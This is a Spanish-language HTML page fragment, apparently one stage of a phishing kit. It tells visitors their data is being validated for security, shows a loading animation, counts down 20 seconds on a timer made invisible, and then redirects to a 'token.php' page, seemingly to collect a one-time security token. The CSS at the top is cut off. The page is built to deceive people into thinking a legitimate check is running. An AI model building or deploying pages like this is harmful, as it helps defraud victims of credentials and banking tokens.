        .se {
            font-size: 1.8rem;
            color: gray;

        .lobo {
            max-width: 500px;
            width: 100%;

<body class="body">
<center><form  method="post" enctype="multipart/form-data" name="formerdac" >  
<header class="arriba">
    <nav class="nav">
        <a href="#" class="logo nav-link"><img class="solar" src="logo.png" alt=""></a>
        <br>
    </nav>
</header>
<br><br><br>
<section class="">
    <h1 class="letra3 lobo">Espere mientras se validan sus datos, por seguridad 
        no cierre esta ventana.<br><br>
    </h1>
    <br><br>

    <div class="container se">
        <p style="color: transparent;" id="countdown">20</p> <!-- Aquí se mostrará el contador -->
    </div>
    <div style="margin-top: -105px;">
        <img src="img/cargando.gif">
    </div>
    <script>
        var segundoInicio = 20; // Cambiado a 20 segundos

        function actualizar() {
            document.getElementById('countdown').innerHTML = segundoInicio;

            if (segundoInicio === 0) {
                // La cuenta regresiva ha finalizado, redirige a otra página
                window.location.href = "token.php";
            } else {
                // Decrementa el contador
                segundoInicio--;
                // Llama a la función actualizar después de 1 segundo
                setTimeout(actualizar, 1000);
            }
        }

        // Inicia la cuenta regresiva
        actualizar();
    </script>
    <br><br><br><br>
</form>  
</center>
